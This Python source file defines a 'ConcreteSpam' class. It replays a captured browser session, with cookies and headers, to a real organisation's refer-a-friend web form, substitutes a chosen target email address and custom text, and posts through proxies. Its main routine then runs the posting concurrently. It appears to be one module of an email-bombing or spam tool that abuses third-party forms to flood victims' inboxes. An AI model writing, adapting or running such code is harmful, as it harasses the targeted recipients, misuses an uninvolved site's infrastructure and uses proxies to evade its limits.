from os.path import basename

import requests

from module import Spam


class ConcreteSpam(Spam):

    def post(self, target) -> requests.Response | None:
        cookies = {
            'PHPSESSID': 'ab8tn0mkuvj32aeivkosadg2cs',
            'handl_original_ref': 'https%3A%2F%2Fwww.google.com%2F',
            'handl_landing_page': 'https%3A%2F%2Fwww.14streety.org%2Fabout-us%2Fmembership%2Frefer-a-friend%2F',
            'handl_ip': '84.17.48.101',
            '_ga': 'GA1.2.174651406.1678104494',
            '_gid': 'GA1.2.838293904.1678104494',
            'close_subscribe_popup_window': '1',
            '_fbp': 'fb.1.1678104494402.1348571301',
            '_gat_UA-7186556-1': '1',
            'handl_url': 'https%3A%2F%2Fwww.14streety.org%2Fwp-content%2Fthemes%2Fjcc%2Fjs%2Flibs%2Fsvg-injector.map.js%2F',
        }

        headers = {
            'authority': 'www.14streety.org',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'no-cache',
            'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryi9QADHfB70J06jnJ',
            # 'cookie': 'PHPSESSID=ab8tn0mkuvj32aeivkosadg2cs; handl_original_ref=https%3A%2F%2Fwww.google.com%2F; handl_landing_page=https%3A%2F%2Fwww.14streety.org%2Fabout-us%2Fmembership%2Frefer-a-friend%2F; handl_ip=84.17.48.101; _ga=GA1.2.174651406.1678104494; _gid=GA1.2.838293904.1678104494; close_subscribe_popup_window=1; _fbp=fb.1.1678104494402.1348571301; _gat_UA-7186556-1=1; handl_url=https%3A%2F%2Fwww.14streety.org%2Fwp-content%2Fthemes%2Fjcc%2Fjs%2Flibs%2Fsvg-injector.map.js%2F',
            'origin': 'https://www.14streety.org',
            'pragma': 'no-cache',
            'referer': 'https://www.14streety.org/about-us/membership/refer-a-friend/',
            'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'iframe',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
        }

        data = '------WebKitFormBoundaryi9QADHfB70J06jnJ\r\nContent-Disposition: form-data; name="input_1.3"\r\n\r\ntest\r\n------WebKitFormBoundaryi9QADHfB70J06jnJ\r\nContent-Disposition: form-data; name="input_1.6"\r\n\r\ntest\r\n------WebKitFormBoundaryi9QADHfB70J06jnJ\r\nContent-Disposition: form-data; name="input_2"\r\n\r\nwezxasqw@gmail.com\r\n------WebKitFormBoundaryi9QADHfB70J06jnJ\r\nContent-Disposition: form-data; name="input_13"\r\n\r\n1231231234\r\n------WebKitFormBoundaryi9QADHfB70J06jnJ\r\nContent-Disposition: form-data; name="input_3.3"\r\n\r\ntest\r\n------WebKitFormBoundaryi9QADHfB70J06jnJ\r\nContent-Disposition: form-data; name="input_3.6"\r\n\r\ntest\r\n------WebKitFormBoundaryi9QADHfB70J06jnJ\r\nContent-Disposition: form-data; name="input_5"\r\n\r\nwezxasqw@gmail.com\r\n------WebKitFormBoundaryi9QADHfB70J06jnJ\r\nContent-Disposition: form-data; name="input_14"\r\n\r\n1231231234\r\n------WebKitFormBoundaryi9QADHfB70J06jnJ\r\nContent-Disposition: form-data; name="input_6"\r\n\r\n\r\n------WebKitFormBoundaryi9QADHfB70J06jnJ\r\nContent-Disposition: form-data; name="input_7"\r\n\r\n\r\n------WebKitFormBoundaryi9QADHfB70J06jnJ\r\nContent-Disposition: form-data; name="input_8"\r\n\r\n\r\n------WebKitFormBoundaryi9QADHfB70J06jnJ\r\nContent-Disposition: form-data; name="input_9"\r\n\r\n\r\n------WebKitFormBoundaryi9QADHfB70J06jnJ\r\nContent-Disposition: form-data; name="input_10"\r\n\r\n\r\n------WebKitFormBoundaryi9QADHfB70J06jnJ\r\nContent-Disposition: form-data; name="input_11"\r\n\r\n\r\n------WebKitFormBoundaryi9QADHfB70J06jnJ\r\nContent-Disposition: form-data; name="input_12"\r\n\r\nhttps://www.google.com/\r\n------WebKitFormBoundaryi9QADHfB70J06jnJ\r\nContent-Disposition: form-data; name="gform_ajax"\r\n\r\nform_id=36&title=&description=&tabindex=0\r\n------WebKitFormBoundaryi9QADHfB70J06jnJ\r\nContent-Disposition: form-data; name="is_submit_36"\r\n\r\n1\r\n------WebKitFormBoundaryi9QADHfB70J06jnJ\r\nContent-Disposition: form-data; name="gform_submit"\r\n\r\n36\r\n------WebKitFormBoundaryi9QADHfB70J06jnJ\r\nContent-Disposition: form-data; name="gform_unique_id"\r\n\r\n\r\n------WebKitFormBoundaryi9QADHfB70J06jnJ\r\nContent-Disposition: form-data; name="state_36"\r\n\r\nWyJbXSIsIjAzYjIwNDNmZjNjODMwN2RhYjI0MzMxYTYyY2Q5YzdhIl0=\r\n------WebKitFormBoundaryi9QADHfB70J06jnJ\r\nContent-Disposition: form-data; name="gform_target_page_number_36"\r\n\r\n0\r\n------WebKitFormBoundaryi9QADHfB70J06jnJ\r\nContent-Disposition: form-data; name="gform_source_page_number_36"\r\n\r\n1\r\n------WebKitFormBoundaryi9QADHfB70J06jnJ\r\nContent-Disposition: form-data; name="gform_field_values"\r\n\r\n\r\n------WebKitFormBoundaryi9QADHfB70J06jnJ\r\nContent-Disposition: form-data; name="version_hash"\r\n\r\n3224feae66c29af4ed83d4a90ac57ae6\r\n------WebKitFormBoundaryi9QADHfB70J06jnJ\r\nContent-Disposition: form-data; name="version_hash"\r\n\r\n3224feae66c29af4ed83d4a90ac57ae6\r\n------WebKitFormBoundaryi9QADHfB70J06jnJ--\r\n'
        data = data.replace('wezxasqw@gmail.com', target)
        data = data.replace('test', self.get_text()).encode()

        response = requests.post(
            'https://www.14streety.org/about-us/membership/refer-a-friend/',
            cookies=cookies,
            headers=headers,
            data=data,
            proxies=self.get_proxies(), timeout=20
        )

        return response


def main():
    s = 'Thanks'

    spam = ConcreteSpam(basename(__file__).removesuffix('.py'), s)
    res = spam.send_post()
    if res:
        spam.run_concurrently()


if __name__ == '__main__':
    main()

